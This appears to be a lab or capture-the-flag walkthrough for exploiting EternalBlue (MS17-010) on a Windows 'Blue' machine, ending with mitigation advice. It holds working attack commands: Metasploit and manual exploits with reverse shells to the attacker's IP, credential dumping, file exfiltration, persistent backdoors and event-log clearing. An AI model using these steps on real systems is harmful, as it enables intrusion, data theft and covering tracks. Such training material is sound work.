# Blue Walkthrough

## Overview
The "Blue" machine demonstrates the exploitation of MS17-010 (EternalBlue), a critical SMB vulnerability that affected Windows systems and was used in major ransomware attacks like WannaCry. This walkthrough covers the complete process of attacking and gaining control of the Blue machine.

## Reconnaissance and Enumeration

### Initial Nmap Scan
```bash
nmap -sV -p- --min-rate 5000 <target_ip>
```

**Key findings:**
- Port 135: msrpc
- Port 139: netbios-ssn
- Port 445: microsoft-ds (SMB)
- Port 3389: ms-wbt-server (RDP)
- Windows operating system detected

### Targeted SMB Scan
```bash
nmap --script smb-vuln* -p 445 <target_ip>
```

**Key findings:**
- MS17-010 vulnerability detected
- SMB signing not required

## Vulnerability Analysis

### MS17-010 (EternalBlue)
- Critical SMB vulnerability in Windows systems
- Allows remote code execution without authentication
- Affects Windows 7, Windows Server 2008, and other Windows versions
- Patched by Microsoft in March 2017 (MS17-010)
- Used in WannaCry ransomware attack in May 2017

## Exploitation Process

### Method 1: Using Metasploit Framework

1. **Start Metasploit**:
   ```bash
   msfconsole
   ```

2. **Search for EternalBlue exploits**:
   ```bash
   search ms17-010
   ```

3. **Select the appropriate exploit**:
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   ```

4. **Configure the exploit**:
   ```bash
   set RHOSTS <target_ip>
   set LHOST <your_ip>
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   ```

5. **Run the exploit**:
   ```bash
   exploit
   ```

6. **Verify Meterpreter shell**:
   ```bash
   getuid
   sysinfo
   ```

### Method 2: Manual Exploitation (Optional)

1. **Clone the exploit repository**:
   ```bash
   git clone https://github.com/worawit/MS17-010.git
   cd MS17-010
   ```

2. **Generate shellcode**:
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw -o shellcode.bin
   ```

3. **Modify the exploit script** (zzz_exploit.py):
   - Update the USERNAME and PASSWORD if needed
   - Adjust paths to shellcode files

4. **Start a netcat listener**:
   ```bash
   nc -lvnp 4444
   ```

5. **Run the exploit**:
   ```bash
   python zzz_exploit.py <target_ip>
   ```

## Post-Exploitation

### Privilege Escalation (If Needed)
- Check current privileges
  ```
  getuid
  ```
- Note: EternalBlue typically gives SYSTEM access directly

### System Enumeration
```
sysinfo
ipconfig
getuid
hashdump
```

### Finding Flags

1. **Navigate the filesystem**:
   ```
   cd C:\\
   dir
   cd Users
   dir
   ```

2. **Search for flags**:
   ```
   search -f flag*.txt
   search -f proof.txt
   search -f user.txt
   ```

3. **Read the flags**:
   ```
   cat "C:\path\to\flag.txt"
   ```

### Data Exfiltration

1. **Accessing user files**:
   ```
   cd C:\Users\<username>\Documents
   dir
   ```

2. **Looking for sensitive information**:
   ```
   search -f *.txt
   search -f *.docx
   search -f *.xlsx
   ```

3. **Downloading interesting files**:
   ```
   download "C:\path\to\interesting_file.docx"
   ```

## Persistence (Optional)

1. **Create a backdoor user**:
   ```
   run post/windows/manage/enable_rdp
   run post/windows/manage/sticky_keys
   ```

2. **Install a persistent backdoor**:
   ```
   run persistence -X -i 30 -p 443 -r <your_ip>
   ```

## Cleanup

1. **Remove artifacts**:
   ```
   clearev
   ```

2. **Exit session**:
   ```
   exit
   ```

## Mitigation Recommendations

If this were a real engagement, recommend:

1. **Apply Security Updates**: Install MS17-010 patch immediately
2. **Disable SMBv1**: Disable outdated and vulnerable SMB version
3. **Network Segmentation**: Restrict SMB traffic to necessary segments only
4. **Regular Patching**: Implement a robust patch management process
5. **Enable SMB Signing**: Require SMB signing on all systems
6. **Implement Application Whitelisting**: Prevent unauthorized code execution

## Lessons Learned

- Unpatched vulnerabilities pose severe security risks
- Critical exploits can provide direct system-level access
- Windows file sharing protocols require careful security configuration
- Legacy protocols (SMBv1) should be disabled when not required
